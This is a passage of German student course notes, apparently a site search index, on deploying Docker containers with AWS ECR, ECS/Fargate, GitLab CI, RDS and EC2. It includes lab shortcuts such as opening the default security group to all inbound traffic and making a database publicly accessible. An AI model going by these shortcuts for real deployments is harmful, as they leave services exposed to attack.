ohne Fehler erfolgt.</p> <pre><code>docker run -d -p 8080:8080 archrefcard-01:latest\n</code></pre> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#image-hochladen","title":"Image hochladen","text":"<ol> <li> <p>Als erstes sollte man die push befehle in der AWS Konsole \u00f6ffnen:</p> <p></p> </li> <li> <p>Als n\u00e4chstes sollte man den Token herausfinden:</p> <pre><code>aws ecr get-login-password --region us-east-1\n</code></pre> <p></p> </li> <li> <p>In Ihrem lokalen Terminal geben Sie nun den zweiten Teil des Befehls nach dem | ein.</p> <pre><code>echo \"&lt;TOKEN&gt;\" | docker login --username AWS --password-stdin 1234EXAMPLE.dkr.ecr.us-east-1.amazonaws.com\n</code></pre> <p></p> </li> <li> <p>Zum schluss muss das Image nur noch generiert und hochgeladen werden mit den folgenden befehlen:</p> <pre><code>docker build -t regli/rechsteiner-app-ref-card-01 .\ndocker tag regli/rechsteiner-app-ref-card-01:latest 12345EXAMPLE.dkr.ecr.us-east-1.amazonaws.com/regli/rechsteiner-app-ref-card-01:latest\ndocker push 12345EXAMPLE.dkr.ecr.us-east-1.amazonaws.com/regli/rechsteiner-app-ref-card-01:latest\n</code></pre> <p></p> </li> </ol>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#vpc","title":"VPC","text":"<p>Anschlie\u00dfend haben wir ein neues VPC erstellt, um unsere Arbeit zu erleichtern. Der Vorteil besteht darin, dass wir die Container in den privaten Subnetzen platzieren und \u00fcber NAT-Instanzen eine Verbindung zum Internet herstellen k\u00f6nnen. Uns ist aufgefallen, dass die Container ohne Internetzugang nicht richtig starten und dass die Kosten in die H\u00f6he getrieben werden, wenn jeder Container eine \u00f6ffentliche IP-Adresse hat. Ein weiterer Punkt ist, dass es sicherer ist, wenn der Service selbst keine \u00f6ffentliche IP-Adresse hat, sondern alles \u00fcber den Load Balancer l\u00e4uft.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#ecs-cluster","title":"ECS Cluster","text":"<p>Aufgabe: Erstellen und dokumentieren sie einen ECS-Cluster. Achten Sie auf sinnvoll benannte Objekte, verwenden Sie keine generischen Namen mehr (z.Bsp. nicht nginx-custom oder fargate-service), sondern Ihren nachnamen-refcard01. </p> <p>Im folgenden sieht man die konfigruation die wir f\u00fcr das Cluster verwendet haben:</p> <p></p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#task-definition","title":"Task Definition","text":"<p>Aufgabe: Erstellen Sie eine Task Definition f\u00fcr App Ref. Card 01. Recherchieren oder testen Sie die Minimal anforderungen an Prozessor und Speicher. </p> <p>Die Task-Definition war sehr einfach, da man nur das Image \":latest\", einen Namen f\u00fcr den Container und einen Port angeben musste, der nach au\u00dfen gemappt werden soll. Wir fanden es jedoch schade, dass man aus irgendeinem Grund nur den Container-Port angeben konnte und nicht noch separat den Host-Port, da wir sp\u00e4ter \u00fcber Port 80 auf den Webserver zugreifen wollten. Wir haben dieses Problem jedoch einfach mit dem Load Balancer umgangen, indem wir ihm gesagt haben, dass er auf Port 8080 auf den Containern h\u00f6ren soll, aber von au\u00dfen \u00fcber Port 80 erreichbar sein soll.</p> <p></p> <p>Die Aufgabe, die minimale Anforderungen an Prozessor und Speicher hatte, konnten wir schnell l\u00f6sen. Wir haben uns f\u00fcr eine Konfiguration mit 0,25 vCPU und 0,5 GB RAM entschieden, da dies das niedrigste ausw\u00e4hlbare Angebot war und der Container damit funktioniert hat.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#load-balancer","title":"Load-Balancer","text":"<p>Aufgabe: Erstellen Sie sich einen Load-Balancer vor Ihrem ECS Service</p> <p>Um einen Load Balancer zu erstellen, navigiert man zuerst zur EC2-Konsole und w\u00e4hlt dann \"Load Balancer\" aus. Dort kann man einen neuen Load Balancer erstellen. Im n\u00e4chsten Schritt muss man dann die Konfiguration des Load Balancers anpassen, je nach den spezifischen Anforderungen des eigenen Projekts. Hier ist ein Beispiel f\u00fcr die Konfiguration, die wir f\u00fcr unseren Load Balancer verwendet haben:</p> <p></p> <p></p> <p>Sicherheitsgruppe f\u00fcr Loadbalancer erstellen:</p> <p></p> <p>Target Gruppe f\u00fcr Loadbalancer erstellen:</p> <p></p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#vpc-security-groups","title":"VPC Security Groups","text":"<p>Aufgabe: Befassen Sie sich mit den VPC Security Groups. Verwenden Sie f\u00fcr die Fallstudie nicht die Default Security Group, sondern erstellen Sie eine neue, sauber benannte Security Group und sichern Sie diese nach \"least privilege\" ab. </p> <p>In der Security Group ist es speziell so konfiguriert, dass der einzige Inbound-Traffic, der erlaubt ist, \u00fcber den Port 8080 kommt und ausschlie\u00dflich vom Load Balancer stammt. Dadurch wird verhindert, dass Traffic, der nicht vom Load Balancer kommt, zu den Containern gelangen kann.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#service-erstellen","title":"Service erstellen","text":"<p>Folgend sieht man die Konfiguration unseres Services</p> <p></p> <p></p> <p>Besonders beim folgenden ist das die Container nur in die Privaten Subnetze kommen:</p> <p></p> <p>Loadbalancer hinzuf\u00fcgen:</p> <p></p> <p>Endergebnis:</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#neue-versionen","title":"Neue Versionen","text":"<p>Aufgabe: Dokumentieren Sie den Ablauf f\u00fcr neue Versionen der ref-card-01: welche ECS Komponenten m\u00fcssen aktualisiert werden? Dokumentieren Sie die ben\u00f6tigten Zeiten f\u00fcr den Neustart und wie lange mehrere Versionen aufrufbar sind. Zusatzaufgabe: Automatisieren Sie diesen Ablauf mit der AWS CLI.</p> AufgabeZusatzaufgabe <p>src/main/resources/templates/index.html so bearbeiten das man nachher einen unterschied sieht:</p> <p></p> <p>Image erneut hochladen:</p> <p></p> <p>Auf dem Service den Neue Bereitstellung erzwingen Hacken ausw\u00e4hlen und speichern:</p> <p></p> <p>Webserver kontrollieren:</p> <p></p> <p>src/main/resources/templates/index.html so bearbeiten das man nachher einen unterschied sieht:</p> <p></p> <p>Image erneut hochladen:</p> <p></p> <p>Auf das AWS CLI gehen und den folgenden befehl ausf\u00fchren:</p> <pre><code>aws ecs update-service --cluster &lt;cluster-name&gt; --service &lt;service-name&gt; --force-new-deployment\n</code></pre> <p></p> <p>Webserver kontrollieren:</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/","title":"Container mit AWS Fargate betreiben","text":"<p>Quelle: https://bbwin.gitlab.io/m169-aws-fargate</p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#arbeitsumgebung","title":"Arbeitsumgebung","text":"<p>F\u00fcr diesen Auftrag ben\u00f6tigen Sie:</p> <ul> <li>AWS Academy Learner Lab</li> <li>Windows mit WSL2 / Ubuntu / Mac</li> <li>Docker Desktop mit aktivierter WSL2 Integration</li> </ul>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#arbeitsverzeichnis","title":"Arbeitsverzeichnis","text":"<p>Starten Sie ein Terminal (WSL2 mit Ubuntu unter Windows) und erstellen Sie sich in Ihrem Homeverzeichnis ein neues Verzeichnis.</p> <pre><code>mkdir m169-aws-fargate\ncd m169-aws-fargate\n</code></pre>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#docker","title":"Docker","text":"<p>Wir arbeiten mit dem alpine-slim Nginx-Image, welches wir mit einem Dockerfile personalisieren. Die Grundlagen haben Sie im Auftrag 10.6_Docker Images erstellen erarbeitet.</p> <p>Erstellen Sie die Datei Dockerfile (Gross-/Kleinschreibung beachten, keine Dateiendung):</p> dockerfile<pre><code>FROM nginx:alpine-slim\nCOPY index.html /usr/share/nginx/html/index.html\n</code></pre> <p>Zus\u00e4tzlich erstellen Sie sich die Datei index.html:</p> index.html<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;title&gt;AWS Fargate Tutorial&lt;/title&gt;\n&lt;/head&gt;\n&lt;body bgcolor=\"PaleGreen\"&gt;\n&lt;p style=\"font-family: Helvetica\"&gt;AWS Fargate Tutorial&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p></p> <p>Als erster Arbeitsschritt pr\u00fcfen wir docker build und starten daraus einen Container</p> <pre><code>docker build -t nginx-custom:latest .\n</code></pre> <p></p> <p>\u00dcberpr\u00fcfen Sie Ihr erstelltes Image mit den bereits bekannten Befehlen images oder inspect, lassen Sie anschliessend Ihr Image lokal mit docker run laufen und stellen Sie eine fehlerfreie Ausf\u00fchrung sicher.</p> <pre><code>sudo docker run -d -p 8080:80 nginx-custom:latest\n</code></pre> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#amazon-elastic-container-registry","title":"Amazon Elastic Container Registry","text":"<p>Im n\u00e4chsten Schritt laden wir unser lokal erstelltes Image in die Amazon Elastic Container Registry, kurz ECR.</p> <p>Dazu ben\u00f6tigen Sie Zugang zu Ihrem AWS Academy Learner Lab. Starten Sie Ihr Lab und \u00f6ffnen Sie die AWS Management Console.</p> <ol> <li> <p>In der AWS Management Console, suchen Sie den Service Elastic Container Registry</p> <p></p> </li> <li> <p>W\u00e4hlen Sie Get Started um ein neues Repository zu erstellen</p> <p></p> </li> <li> <p>W\u00e4hlen Sie als Visibilitiy settings Private und als Repository name nginx-custom. Alle anderen Einstellungen k\u00f6nnen Sie wie vorausgew\u00e4hlt belassen.</p> <p></p> </li> <li> <p>W\u00e4hlen Sie Ihr soeben erstelltes Repository nginx-custom aus</p> <p></p> </li> <li> <p>Rechts finden Sie View push commands. Es enth\u00e4lt personalisierte Befehle damit Sie sich authentifzieren und Ihr Image in Ihre Repository pushen zu k\u00f6nnen.</p> <p></p> <p></p> </li> <li> <p>In Ihrem lokalen Terminal geben Sie nun den zweiten Teil des Befehls nach dem | ein.</p> <pre><code>echo \"&lt;TOKEN&gt;\" | docker login --username AWS --password-stdin 1234EXAMPLE.dkr.ecr.us-east-1.amazonaws.com\n</code></pre> <p></p> </li> <li> <p>F\u00fchren Sie nun die Schritte 2, 3 und 4 aus der Push commands for nginx-custom Anweisung in Ihrer Elastic Container Registry lokal im Terminal aus.</p> <pre><code>docker build -t nginx-custom .\n\ndocker tag nginx-custom:latest 12345EXAMPLE.dkr.ecr.us-east-1.amazonaws.com/nginx-custom:latest\n\ndocker push 12345EXAMPLE.dkr.ecr.us-east-1.amazonaws.com/nginx-custom:latest\n</code></pre> <p></p> </li> </ol>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#amazon-elastic-container-service","title":"Amazon Elastic Container Service","text":""},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#konzept","title":"Konzept","text":"<p>Amazon Elastic Container Service (ECS) ist vergleichbar mit Kubernetes, Docker Swarm, and Azure Container Service.</p> <p>ECS unterst\u00fctzt zwei unterschiedliche Betriebsmodelle:</p> <ul> <li>Fargate: Diese Option ist serverless - Sie k\u00f6nnen Container betreiben, ohne dass Sie Ihre Infrastruktur verwalten m\u00fcssen. Geeignet f\u00fcr kleine Applikationen, Applikationen mit kurzzeitig hohen Lasten oder schnell wechselnde Lasten</li> <li>EC2: Sie konfigurieren EC2-Instanzen (Virtuelle Machinen) in Ihrem Cluster und stellen Sie sie bereit, um Ihre Container auszuf\u00fchren. Geeignet f\u00fcr Applikationen mit konstant hoher CPU und Speichernutzung, Preisoptimierung oder Applikationen mit hohem Specherbedarf.</li> </ul>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#task-definition","title":"Task Definition","text":"<p>Die Task Definition ist eine Vorlage, die beschreibt, welche Docker-Container ausgef\u00fchrt werden sollen und Ihre Anwendung darstellt. In unserem Beispiel w\u00e4ren es ein nginx-custom Container. Es beschreibt die zu verwendenden Images, die n\u00f6tige CPU Rechenleistung, Speicher, die Umgebungsvariablen, die freizugebenden Ports und die Interaktion der Container.</p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#task","title":"Task","text":"<p>Aus einer Task Definition k\u00f6nnen Instanzen gestartet werden, welche die Container gem\u00e4ss dieser Konfiguration beinhaltet. Aus einer Task Definition k\u00f6nnen beliebig viele identische Tasks erstellt werden.</p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#service","title":"Service","text":"<p>Definiert die minimale und maximale Anzahl von Tasks einer Task Definition, die zu einem bestimmten Zeitpunkt ausgef\u00fchrt werden, sowie die automatische Skalierung und das Loadbalancing.</p> <p>Falls die CPU durch den einzigen laufenden Task ausgelastet ist, kann der Service automatisch zus\u00e4tzliche Tasks hinzuf\u00fcgen. Es erlaubt zudem die maximale Anzahl der Tasks zu begrenzen, die ausgef\u00fchrt werden k\u00f6nnen. Dies hilft, die Kosten von AWS unter Kontrolle zu halten</p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#cluster","title":"Cluster","text":"<p>Der Service muss seine Tasks nun irgendwo ausf\u00fchren k\u00f6nnen, damit sie zug\u00e4nglich sind. Er muss einem Cluster zugeordnet werden und der Containerverwaltungsdienst sorgt selbstst\u00e4ndig daf\u00fcr, dass er gen\u00fcgend ECS-Instanzen f\u00fcr Ihren Cluster bereitstellt.</p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#umsetzung","title":"Umsetzung","text":"<ol> <li> <p>In der AWS Management Console, suchen Sie den Service Elastic Container Service</p> <p></p> </li> <li> <p>Erstellen Sie unter Cluster mit Create cluster einen neuen Cluster. Verwenden Sie als Cluster name fargate-cluster</p> <p></p> </li> <li> <p>W\u00e4hlen Sie links im Men\u00fc Task definitions und erstellen Sie eine neue Task Definition mittels Create new task definition. Verwenden Sie nginx-custom als Cluster name und als Image URI Ihre pers\u00f6nliche URL zum privaten Repository aus dem Abschnitt Elastic Container Registry (Beispiel: 12345EXAMPLE.dkr.ecr.us-east-1.amazonaws.com/nginx-custom:latest)</p> <p></p> </li> <li> <p>Nachdem Sie mittels Next zum Teil Configure environment, storage, monitoring, and tags gelangt sind, stellen Sie sicher, dass Sie unter Environment AWS Fargate (serverless) verwenden, setzen Sie CPU auf .25 vCPU und Memory auf .5 GB.</p> <p></p> </li> <li> <p>W\u00e4hlen Sie links im Men\u00fc Cluster und erstellen Sie einen neuen Service.</p> <p></p> </li> <li> <p>Als Compute options w\u00e4hlen Sie Launch type und belassen die restlichen Voreinstellungen.</p> <p></p> </li> <li> <p>Application type muss ein Service sein. Bei Task definition w\u00e4hlen Sie unter Family die zuvor erstellte Task definition nginx-custom mit Revision latest. Desired tasks ist in unserem Fall 1.</p> <p></p> </li> <li> <p>Erstellen Sie eine neue Security Group mit dem Namen fargate-service und einer Beschreibung. Erlauben Sie Type HTTP und Source Anywhere.</p> <p></p> </li> <li> <p>Loadbalancer.</p> <p></p> <p></p> </li> </ol>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/M169-container-aws-fargate/#aktualisiertes-docker-image","title":"Aktualisiertes Docker Image","text":"<p>Ihr Container l\u00e4uft nun mit einer \u00f6ffentlichen IP in AWS. Sie st\u00f6ren sich aber an der Hintergrundfarbe der Webseite und m\u00f6chten deshalb eine neue Version Ihres nginx-custom erstellen.</p> <p>\u00d6ffnen Sie dazu die Datei index.html in einem Editor (nano index.html oder falls Sie die Visual Studio Code Remote Development Extension aktiviert haben indem Sie das Verzeichnis mit code . in VS Code \u00f6ffnen). W\u00e4hlen eine neue Hintergrundfarbe und ersetzen Sie den Wert  mit der gew\u00e4hlten Farbe.  <p>Wiederholen SIe die Push commands for nginx-custom aus dem Abschnitt Amazon Elastic Container Registry.</p> <pre><code>docker build -t nginx-custom .\ndocker tag nginx-custom:latest 12345EXAMPLE.dkr.ecr.us-east-1.amazonaws.com/nginx-custom:latest\ndocker push 12345EXAMPLE.dkr.ecr.us-east-1.amazonaws.com/nginx-custom:latest\n</code></pre> <p>In Ihrem private Repository in AWS ECR finden Sie nun zwei Images.</p> <p></p> <p>Um den neuen Container im Service zu Deployen w\u00e4hle den Service aus und gehe dann auf Aktualisieren.</p> <p></p> <p>Danach muss man den hacken \"Neue Beretistellung erzwingen\" ausw\u00e4hlen und dann auf Aktualisieren. Wenn man dann eine weile wartet sollte die Loadbalancer URL umschalten.</p> <p></p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/","title":"Capture The Flag vorbereitung","text":""},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#dockerfile","title":"Dockerfile","text":"<p>Als ersten Schritt forken wir das Repository, das uns als Aufgabe gestellt wurde:</p> <p></p> <p>Anschlie\u00dfend erstellen wir ein Dockerfile, welches einen ausf\u00fchrbaren Docker-Container generiert (Testen in einer VM oder im WSL, wenn auf Sicherheit geachtet werden soll). Nachfolgend sehen Sie ein beispielhaften Code:</p> <p></p> Dockerfile Java 11<pre><code>FROM maven:3-openjdk-11-slim as builder\nCOPY src /src\nCOPY pom.xml /\nRUN mvn -f pom.xml clean package\nFROM adoptopenjdk/openjdk11:alpine-jre\nCOPY --from=builder /target/*.jar app.jar\nENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"]\n</code></pre> Dockerfile Java 13<pre><code>FROM maven:3.6.1-jdk-13-alpine as builder\nCOPY src /src\nCOPY pom.xml /\nRUN mvn -f pom.xml clean package\nFROM adoptopenjdk/openjdk13:alpine-jre\nCOPY --from=builder /target/*.jar app.jar\nENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"]\n</code></pre> Dockerfile Java 17<pre><code>FROM maven:3.8.5-openjdk-17-slim as builder\nCOPY src /src\nCOPY pom.xml /\nRUN mvn -f pom.xml clean package\nFROM eclipse-temurin:17-jre-alpine\nCOPY --from=builder /target/*.jar app.jar\nENTRYPOINT [\"java\",\"-jar\",\"/app.jar\"]\n</code></pre>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#repository-erstellen","title":"Repository erstellen","text":"<p>Nachdem das Dockerfile erstellt wurde, starten wir das Learner-Lab, navigieren zum Service ECR und erstellen ein neues privates Repository.</p> <p></p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#gitlab-variablen","title":"GitLab-Variablen","text":"<p>Um geheime Informationen f\u00fcr CI/CD nicht f\u00fcr jeden zug\u00e4nglich zu machen, m\u00fcssen wir Secret Variables erstellen. Die ersten drei finden wir im Learner Lab, wenn wir auf AWS-Details und dann auf AWS CLI klicken. Die Variablen hei\u00dfen: \"AWS_ACCESS_KEY_ID\", \"AWS_SECRET_ACCESS_KEY\" und \"AWS_SESSION_TOKEN\".</p> <p></p> <p>Die weiteren drei Variablen finden wir im neu erstellten Repository. Die Variablen und ihre Werte sind: \"AWS_DEFAULT_REGION\" = \"us-east-1\", \"CI_AWS_ECR_REGISTRY\" = \"910977011815.dkr.ecr.us-east-1.amazonaws.com\" und \"CI_AWS_ECR_REPOSITORY_NAME\" = \"refcard-03\".</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#gitlab-ciyml-erstellen","title":".gitlab-ci.yml erstellen","text":"<p>Im Folgenden wird ein .gitlab-ci.yml vorgestellt, das dazu dient, ein Docker-Image zu generieren und es in ein AWS-Repository hochzuladen.</p> <p></p> .gitlab-ci.yml<pre><code>image: docker:23.0.4\nvariables:\nDOCKER_HOST: tcp://docker:2375\nDOCKER_TLS_CERTDIR: \"\"\nservices:\n- docker:23.0.4-dind\npackage:\nstage: build\nbefore_script:\n- apk add --no-cache py3-pip\n- pip install awscli\n- aws --version\n- aws ecr get-login-password | docker login --username AWS --password-stdin $CI_AWS_ECR_REGISTRY\nscript:\n- docker build --cache-from $CI_AWS_ECR_REGISTRY/$CI_AWS_ECR_REPOSITORY_NAME:latest -t $CI_AWS_ECR_REGISTRY/$CI_AWS_ECR_REPOSITORY_NAME:latest .\n- docker push $CI_AWS_ECR_REGISTRY/$CI_AWS_ECR_REPOSITORY_NAME:latest\n</code></pre> <p>Sobald diese Datei erstellt wurde, sollte automatisch ein Runner gestartet werden, vorausgesetzt ein solcher ist konfiguriert. Dies kann man unter Settings - CI/CD - Runners \u00fcberpr\u00fcfen.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#erstellen-eines-ecs-clusters","title":"Erstellen eines ECS Clusters","text":"<p>Anschlie\u00dfend beginnen wir mit der Erstellung eines ECS Clusters. Der Name spielt hierbei keine Rolle, wichtig ist nur, den Namespace zu entfernen, damit das Cluster im Learner Lab erstellt werden kann.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#datenbank-erstellen-optional","title":"Datenbank erstellen (optional)","text":"<p>F\u00fcr refcard03 war es notwendig, eine Datenbank zu verbinden, daher habe ich ein RDS erstellt. F\u00fcr die Capture The Flag Aufgabe ist dies jedoch nicht erforderlich.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#erstellung-einer-task-definition","title":"Erstellung einer Task Definition","text":"<p>Nun erstellen wir eine Taskdefinition mit der Image-URL des Repositories (am Ende sollte :latest stehen). Der Port ist vom Image abh\u00e4ngig und die Environment-Variablen werden nur mit der RDS-Datenbank ben\u00f6tigt.</p> <p></p> <p>F\u00fcr Task-Rolle und Task-Ausf\u00fchrungsrolle sollten wir \"LabRole\" ausw\u00e4hlen.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#anderung-der-security-group","title":"\u00c4nderung der Security Group","text":"<p>Aus Gr\u00fcnden der Schnelligkeit kann man in der Default Security Group festlegen, dass jeder eingehende Traffic zugelassen wird.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#erstellung-eines-services-im-ecs-cluster","title":"Erstellung eines Services im ECS Cluster","text":"<p>Folgen Sie den untenstehenden Konfigurationen (je nach Docker-Image k\u00f6nnen \u00c4nderungen erforderlich sein).</p> <p></p> <p></p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/capture-the-flag/#testen-des-loadbalancers","title":"Testen des Loadbalancers","text":"<p>Um den Loadbalancer zu testen, k\u00f6nnen wir zu EC2 gehen und dort auf Loadbalancer klicken. Anschlie\u00dfend kopieren wir den DNS-Namen.</p> <p></p> <p>Diesen Loadbalancer-Namen geben wir dann in den Browser ein und nach einiger Zeit sollten wir die Webanwendung sehen.</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ref-card-03-rds/","title":"Ref Card 03 mit RDS Mysql Datenbank","text":""},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ref-card-03-rds/#projektbeschreibung","title":"Projektbeschreibung","text":"<p>Das Ref-Card-03-Projekt ist ein Docker-Utility, das Entwicklern erm\u00f6glicht, Docker-Container mit dem NGINX-Webserver und einer einfachen HTML-Datei bereitzustellen.</p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ref-card-03-rds/#voraussetzungen","title":"Voraussetzungen","text":"<p>Betriebssystem: Das Ref-Card-03-Projekt kann auf Linux (WSL) ausgef\u00fchrt werden. Docker: Stellen Sie sicher, dass Docker auf Ihrem System installiert ist und Sie die erforderlichen Berechtigungen haben, um Docker-Container auszuf\u00fchren.</p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ref-card-03-rds/#git-repository-herunterladen","title":"Git Repository herunterladen","text":"<p>Github Repository: https://github.com/masluse/ref-card-03</p> <p>Klonen Sie das Repository auf Ihren lokalen Computer und navigieren Sie in das Projektverzeichnis: <pre><code>git clone https://github.com/masluse/ref-card-03\ncd ref-card-03\n</code></pre></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ref-card-03-rds/#rds-instanz-erstellen","title":"RDS Instanz Erstellen","text":"<p>Um die RDS Instanz zu erstellen kann man den folgenden Schritten folgen:</p> <p>\u00c4nderungen:</p> <ul> <li> <p>Engine type = MariaDB</p> </li> <li> <p>Templates = Free tier</p> </li> </ul> <p> </p> <p>\u00c4nderungen:</p> <ul> <li> <p>DB instance identifier = jokedb</p> </li> <li> <p>Master username = 'Username'</p> </li> <li> <p>Master password = 'Password'</p> </li> <li> <p>Confirm master password = 'Password'</p> </li> </ul> <p> </p> <p>\u00c4nderungen:</p> <ul> <li> <p>Public access = Yes</p> </li> <li> <p>VPC security group = 3306 von deinem Client aus erreichbar</p> </li> </ul> <p> </p> <p>\u00c4nderungen:</p> <ul> <li>Initial database name = jokedb</li> </ul> <p> </p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ref-card-03-rds/#git-repository-umkonfigurieren","title":"Git Repository umkonfigurieren","text":"<p>\u00c4nderungen:</p> <ul> <li> <p>Endpoint in docker-compose.yml hinzuf\u00fcgen</p> </li> <li> <p>DB-USERNAME = 'Username' und DB_PASSWORD = 'Password' anpassen</p> </li> </ul> <p> </p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ref-card-03-rds/#testen","title":"Testen","text":"<pre><code>docker compose up\n</code></pre> <p>Browser: localhost:8080</p> <p> </p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/","title":"Wordpress Stack bei AWS","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#wordpress-stack-bei-aws","title":"Wordpress Stack bei AWS","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#auftrag","title":"Auftrag","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#wordpress-mit-amazon-rds-bereitstellen","title":"WordPress mit Amazon RDS bereitstellen","text":""},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#erstellen-einer-mysql-datenbank-mit-rds","title":"Erstellen einer MySQL-Datenbank mit RDS","text":"<p>Um eine Datenbank zu erstellen, muss unter Amazon Cloud nach RDS suchen und dann auf \u00abDatenbank erstellen\u00bb gehen.</p> <p></p> <p>Als Engine-Typ benutzen wir MySQL</p> <p></p> <p>Als Vorlage benutzen man \u201eKostenloses Kontingent\u201c</p> <p></p> <p>In den Einstellungen \u00e4ndern man die DB-Instance-Kennung zu \u201eWordPress\u201c, den Hauptbenutzernamen zu \u201eadmin\u201c (falls anders) und das Passwort kann man selbst w\u00e4hlen.</p> <p></p> <p>Als n\u00e4chstes \u00f6ffnet man den Reiter \u201eZus\u00e4tzliche Konfiguration\u201c</p> <p></p> <p>Dort \u00e4ndert man noch den \u201eAnf\u00e4nglicher Datenbankname\u201c zu wordpress</p> <p></p> <p>Wenn dies alles Konfiguriert ist dr\u00fcckt man auf Datenbank erstellen</p> <p></p>"},{"location":"BBW/Ruettimann/346%20-%20Cloud%20L%C3%B6sungen%20konzipieren%20und%20realisieren/Wordpress-Stack-bei-AWS/#erstellen-einer-ec2-instance","title":"Erstellen einer EC2-Instance","text":"<p>Um eine EC2-Instanz zu erstellen, sucht man in der Suche nach EC2 und geht dann wenn man es gefunden hat auf \u201eInstance starten\u201c</p> <p></p> <p>Als Name kann man nehmen, was man will, Ich habe mich f\u00fcr \u201eEC2-WordPress\u201c entschieden.</p> <p></p> <p>Als Image kann man im Grunde jedes nehmen, Ich w\u00fcrde aber \u201eAmazon Linux\u201c benutzen da die Befehle auf einem anderen OS eine andere Syntax haben.</p> <p></p> <p>F\u00fcr die Kostenlose Benutzung w\u00fcrde ich die \u201et2.micro\u201c nehmen da diese 750 Stunden pro Monat kostenlos benutzbar ist.</p> <p></p> <p>Als Schl\u00fcsselpaar (SSH Key) kann man entweder einen neuen erstellen oder einen bereits vorhandenes verwenden.</p> <p></p> <p>In den Netzwerkeinstellungen \u00e4ndert man zur einfachheitshalber den Namen und die Beschreibung zur 